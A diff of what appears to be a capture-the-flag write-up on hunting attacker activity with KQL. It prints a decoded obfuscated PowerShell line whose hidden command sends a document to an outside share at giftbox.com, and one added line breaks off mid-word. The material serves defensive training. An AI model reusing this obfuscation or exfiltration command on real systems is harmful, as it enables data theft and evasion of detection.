@@ -137,11 +137,11 @@ The filename has to be reversed using `echo txt.tsiLeciNythguaN | rev`
 
 The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?
 
-The activity was performed (2023-12-24T16:58:43Z)
+The activity was performed at 2023-12-24T16:58:43Z.
+Base64 decoding leads to:  
+`[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*Mdr*').NamE[3,11,2]-joiN`
 
-base64 decoded:  
-[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*Mdr*').NamE[3,11,2]-joiN
-
+This is the de
 downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
 
   
@@ -176,5 +176,5 @@ Beware the Cube that Wombles
 
 **Achievement: KQL Kraken Hunt**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTMwNTc5ODU0NCwtMjAxMDE5MjYzXX0=
+eyJoaXN0b3J5IjpbLTgwMzcyNTExMywtMjAxMDE5MjYzXX0=
 -->
